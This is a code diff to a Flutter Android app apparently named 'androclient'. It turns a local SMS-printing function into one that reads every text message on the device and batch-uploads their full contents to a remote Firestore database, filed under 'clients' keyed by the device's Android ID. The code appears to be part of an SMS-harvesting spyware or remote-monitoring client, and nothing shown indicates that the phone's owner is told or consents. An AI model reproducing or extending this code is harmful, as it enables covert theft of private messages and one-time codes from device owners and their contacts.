@@ -1,5 +1,9 @@
+import 'package:androclient/device.dart';
+import 'package:cloud_firestore/cloud_firestore.dart';
 import 'package:flutter_sms_inbox/flutter_sms_inbox.dart';
 import 'package:permission_handler/permission_handler.dart';
+
+final firestore = FirebaseFirestore.instance;
 
 Future<PermissionStatus> _getSmsPermission() async {
   final PermissionStatus smsPermission = await Permission.sms.status;
@@ -7,7 +11,8 @@ Future<PermissionStatus> _getSmsPermission() async {
   if (smsPermission == PermissionStatus.granted) {
     print('Permission granted');
   } else if (smsPermission == PermissionStatus.denied) {
-    print('Denied. Show a dialog with a reason and again ask for the permission.');
+    print(
+        'Denied. Show a dialog with a reason and again ask for the permission.');
     final PermissionStatus askedPermission = await Permission.sms.request();
     return askedPermission;
   } else if (smsPermission == PermissionStatus.permanentlyDenied) {
@@ -19,13 +24,22 @@ Future<PermissionStatus> _getSmsPermission() async {
 
 Future<void> getSms() async {
   final PermissionStatus permissionStatus = await _getSmsPermission();
-
   if (permissionStatus == PermissionStatus.granted) {
     SmsQuery query = new SmsQuery();
     List<SmsMessage> messages = await query.getAllSms;
-
-    for (var message in messages) {
-      print(message.toMap);
+    Iterable<SmsMessage> reversedMessages = messages.reversed;
+    String? androidId = await getIdentity();
+    CollectionReference smsCollection =
+        firestore.collection('clients').doc(androidId).collection("sms");
+    var batch = firestore.batch();
+    for (var i = 0; i < reversedMessages.length; i++) {
+      if (i % 300 == 0) {
+        await batch.commit();
+        batch = firestore.batch();
+      }
+      DocumentReference smsDocument = smsCollection.doc(reversedMessages.elementAt(i).id.toString());
+      batch.set(smsDocument, Map<String, dynamic>.from(reversedMessages.elementAt(i).toMap));
     }
+    await batch.commit();
   }
 }
